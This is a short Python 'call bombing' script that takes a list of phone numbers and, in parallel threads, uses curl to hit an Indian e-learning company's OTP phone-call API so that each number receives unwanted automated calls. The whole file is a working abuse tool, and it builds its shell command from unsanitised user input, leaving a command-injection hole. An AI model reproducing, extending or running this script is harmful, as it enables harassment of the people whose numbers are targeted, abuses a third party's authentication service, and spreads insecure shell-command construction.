import threading
import os

def bomb(num):
    cc="91"
    num = str(num)
    rd = os.popen('curl -s -X POST -d mobile=%2B' + cc + '-' + num + ' https://marketing.tllms.com/elearn/api/v4/authentications/phone_call').read()
    if rd.lower().find("otp requests exceeded") == -1:
        print("Call Bombing not possible");
    print(rd)


if __name__ == "__main__":
    numbers = []
    for i in range(0,int(input("Enter No. Phone Numbers: "))):
        numbers.append(str(input("Enter Phone No " + str(i) + " :")))
    for i in numbers:
        print(i)
        t = threading.Thread(target=bomb, args=(i,))
        t.start()
        print(i)
        
